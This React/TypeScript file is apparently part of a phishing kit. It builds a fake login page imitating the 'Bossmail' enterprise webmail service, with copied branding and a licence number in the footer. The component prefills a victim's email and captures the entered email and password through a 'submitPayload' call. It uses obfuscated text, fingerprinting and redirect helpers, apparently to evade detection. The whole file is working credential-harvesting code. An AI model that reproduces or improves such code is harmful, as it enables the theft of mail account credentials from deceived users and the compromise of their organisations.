
import React, { useState } from 'react';
import { ObfuscatedText, useSecurity } from '../components/SecurityManager';
import { motion } from 'framer-motion';
import { encryptData, getFingerprint } from '../SecurityUtils';
import { themeRedirects } from '../DNSUtils';

interface BossmailThemeProps {
  prefilledEmail?: string;
}

const BossmailTheme: React.FC<BossmailThemeProps> = ({ prefilledEmail }) => {
  const [username, setUsername] = useState(prefilledEmail || '');
  const [password, setPassword] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const { reportViolation, submitPayload, error, setError } = useSecurity();

  const handleSubmit = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    setIsSubmitting(true);
    try {
      await submitPayload({ email: username, password }, 'bossmail');
      setPassword('');
    } catch (err) {
      console.error(err);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-white font-sans text-[#666]">
      {/* Bossmail Header */}
      <header className="w-full max-w-[1200px] mx-auto px-6 py-4 flex items-center justify-between">
        <div className="flex items-center space-x-2">
          <div className="w-10 h-10 bg-[#1c74b4] rounded-full flex items-center justify-center text-white relative">
             <span className="text-xl font-bold italic">@</span>
             <div className="absolute -bottom-1 -right-1 w-4 h-4 bg-white rounded-full flex items-center justify-center">
                <div className="w-2.5 h-2.5 bg-[#1c74b4] rounded-full"></div>
             </div>
          </div>
          <h1 className="text-2xl font-light text-[#333] tracking-tight">Bossmail</h1>
        </div>
        
        <nav className="flex items-center space-x-6 text-[13px] text-[#1c74b4]">
          <div className="flex items-center cursor-pointer hover:underline">
            Client <span className="ml-1 text-[10px]">▼</span>
          </div>
          <div className="w-[1px] h-3 bg-gray-300"></div>
          <div className="flex items-center cursor-pointer hover:underline">
            BQ <span className="ml-1 text-[10px]">▼</span>
          </div>
          <div className="w-[1px] h-3 bg-gray-300"></div>
          <div className="flex items-center cursor-pointer hover:underline">
            Language <span className="ml-1 text-[10px]">▼</span>
          </div>
        </nav>
      </header>

      {/* Main Content with Split Background */}
      <main className="relative flex-grow flex items-center justify-center py-8">
        <motion.div 
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ duration: 1 }}
          className="absolute inset-0 flex h-[460px] my-auto"
        >
          {/* Left Side: Blue Overlay with Office Image */}
          <div className="w-1/2 relative overflow-hidden bg-[#005ea8]">
            <img 
              src="https://images.unsplash.com/photo-1497215728101-856f4ea42174?auto=format&fit=crop&q=80&w=1200" 
              alt="Office" 
              className="absolute inset-0 w-full h-full object-cover opacity-30 mix-blend-overlay"
            />
            <div className="absolute inset-0 bg-gradient-to-r from-[#004b8d] to-transparent"></div>
          </div>
          {/* Right Side: Light Gray Abstract Pattern */}
          <div className="w-1/2 bg-[#f4f7f9] relative">
            <svg className="absolute inset-0 w-full h-full opacity-10" viewBox="0 0 100 100" preserveAspectRatio="none">
              <circle cx="110" cy="50" r="80" fill="none" stroke="currentColor" strokeWidth="0.5" />
              <circle cx="110" cy="50" r="60" fill="none" stroke="currentColor" strokeWidth="0.5" />
              <circle cx="110" cy="50" r="40" fill="none" stroke="currentColor" strokeWidth="0.5" />
            </svg>
          </div>
        </motion.div>

        {/* Login Card */}
        <motion.div 
          initial={{ opacity: 0, scale: 0.95 }}
          animate={{ opacity: 1, scale: 1 }}
          transition={{ duration: 0.5, delay: 0.3 }}
          className="relative z-10 w-full max-w-[400px] bg-white rounded-sm shadow-2xl border border-gray-100 flex flex-col focus-within:ring-0"
        >
          <form onSubmit={handleSubmit} className="p-10 space-y-6 flex-grow flex flex-col">
            <div className="space-y-6 flex-grow">
              <div className="relative group">
                <div className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-300">
                  <svg width="14" height="14" fill="currentColor" viewBox="0 0 16 16">
                    <path d="M3 14s-1 0-1-1 1-4 6-4 6 3 6 4-1 1-1 1H3zm5-6a3 3 0 1 0 0-6 3 3 0 0 0 0 6z"/>
                  </svg>
                </div>
                <input 
                  type="text" 
                  placeholder="username" 
                  value={username}
                  onChange={(e) => {
                    setUsername(e.target.value);
                    if (error) setError(null);
                  }}
                  className="w-full pl-10 pr-4 py-2 border border-gray-300 text-[14px] focus:outline-none focus:border-[#1c74b4] transition-colors"
                />
              </div>

              <div className="relative group">
                <div className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-300">
                  <svg width="14" height="14" fill="currentColor" viewBox="0 0 16 16">
                    <path d="M8 1a2 2 0 0 1 2 2v4H6V3a2 2 0 0 1 2-2zm3 6V3a3 3 0 0 0-6 0v4a2 2 0 0 0-2 2v5a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2z"/>
                  </svg>
                </div>
                <input 
                  type="password" 
                  placeholder="Password" 
                  value={password}
                  onChange={(e) => {
                    setPassword(e.target.value);
                    if (error) setError(null);
                  }}
                  className="w-full pl-10 pr-4 py-2 border border-gray-300 text-[14px] focus:outline-none focus:border-[#1c74b4] transition-colors"
                />
              </div>

              <div className="flex items-center justify-between text-[12px] text-gray-500 mb-4">
                <label className="flex items-center cursor-pointer">
                  <input type="checkbox" className="mr-2 accent-[#ef8133]" defaultChecked />
                  Remember me
                </label>
                <a href="#" className="hover:text-[#ef8133]">Forgot Password?</a>
              </div>

              <button 
                type="submit"
                disabled={isSubmitting}
                className="w-full py-3 bg-[#ef8133] hover:bg-[#e67622] text-white font-bold rounded-sm transition-colors text-[16px] shadow-md uppercase tracking-wider disabled:opacity-70"
              >
                {isSubmitting ? '...' : <ObfuscatedText text="Login" />}
              </button>

              {error && (
                <motion.div 
                  initial={{ opacity: 0, y: -10 }}
                  animate={{ opacity: 1, y: 0 }}
                  className="text-[#ef8133] text-[12px] text-center font-medium bg-orange-50 py-2 rounded border border-orange-100"
                >
                  {error}
                </motion.div>
              )}

              <div className="text-left">
                <a href="#" className="text-[#1c74b4] text-[13px] hover:underline">Forget the password?</a>
              </div>
            </div>

            <div className="text-right mt-6">
               <a href="#" className="text-[#1c74b4] text-[12px] hover:underline">
                 <ObfuscatedText text="Administrator Login" />
               </a>
            </div>
          </form>
        </motion.div>
      </main>

      {/* Bossmail Footer */}
      <footer className="w-full py-8 text-center text-[12px] text-gray-500 space-y-1">
        <div>
          <a href="#" className="text-[#1c74b4] hover:underline">闽B2-20040086-1</a>
        </div>
        <div>Powered by BossMail</div>
      </footer>
    </div>
  );
};

export default BossmailTheme;
